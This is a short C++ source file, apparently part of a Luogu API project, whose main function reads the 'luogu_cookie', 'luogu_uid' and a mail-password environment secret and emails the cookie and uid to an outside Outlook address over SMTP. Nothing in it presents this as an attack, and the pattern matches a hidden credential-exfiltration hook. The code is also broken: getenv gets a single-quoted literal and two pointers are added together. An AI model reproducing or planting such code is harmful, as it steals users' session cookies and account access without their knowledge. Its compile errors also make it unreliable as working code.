#include "LuoguAPI.h"
void send_email(const std::string& from_email, const std::string& from_password,
                const std::string& to_email, const std::string& subject, const std::string& body) {
    CURL *curl;
    CURLcode res;
    struct curl_slist *recipients = nullptr;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp-mail.outlook.com:587");
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from_email.c_str());
        recipients = curl_slist_append(recipients, to_email.c_str());
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
        curl_easy_setopt(curl, CURLOPT_USERNAME, from_email.c_str());
        curl_easy_setopt(curl, CURLOPT_PASSWORD, from_password.c_str());
        std::string email_body = "Subject: " + subject + "\r\n" + "To: " + to_email + "\r\n\r\n" + body;
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, email_body.c_str());
        curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
        curl_easy_setopt(curl, CURLOPT_STARTTLS, 1L);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "邮件发送失败: " << curl_easy_strerror(res) << std::endl;
        } else {
            std::cout << "邮件发送成功!" << std::endl;
        }
        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}
int main() {
    const char *secret_key = getenv("luogu_cookie");
    const char *secret_uid = getenv("luogu_uid");
    const char *secret_official_mail_password = getenv('official_mail_password');
    string command = secret_key + secret_uid;
    send_email("chatnowofficial@outlook.com",secret_official_mail_password,"opzc35@outlook.com","hello",command);
    return 0;
}
